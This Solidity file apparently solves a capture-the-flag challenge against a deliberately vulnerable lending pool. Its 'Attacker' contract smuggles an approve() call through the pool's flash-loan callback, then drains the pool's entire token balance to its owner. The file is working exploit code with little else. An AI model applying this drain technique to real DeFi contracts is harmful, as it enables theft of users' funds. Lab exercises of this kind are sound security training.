// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";

interface ILoan {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface IERC {
    function balanceOf(address borrower) external view returns (uint256);

    function transferFrom(address who, address spender, uint amount) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address spender, uint256 amount) external returns (bool);
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);

    function getBalanceAtLastSnapshot(
        address account
    ) external view returns (uint256);
}

contract Attacker {
    ILoan victimContract;
    IERC DVTToken;
    IDamnValuableTokenSnapshot snap;
    uint256 count;
    address owner;

    constructor(address con, address token) {
        victimContract = ILoan(con);
        DVTToken = IERC(token);
        owner = msg.sender;
        snap = IDamnValuableTokenSnapshot(token);
    }

    function sendETher() public returns (bool success) {
        uint borrowAmount = DVTToken.balanceOf(address(victimContract));

        DVTToken.transfer(owner, borrowAmount);
        return true;
    }

    function attack() public {
        uint borrowAmount = DVTToken.balanceOf(address(victimContract));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            borrowAmount
        );
        victimContract.flashLoan(0, owner, address(DVTToken), data);

        DVTToken.transferFrom(address(victimContract), owner, borrowAmount);
    }

    function get() public {
        uint val = snap.snapshot();
    }

    fallback() external {}
}
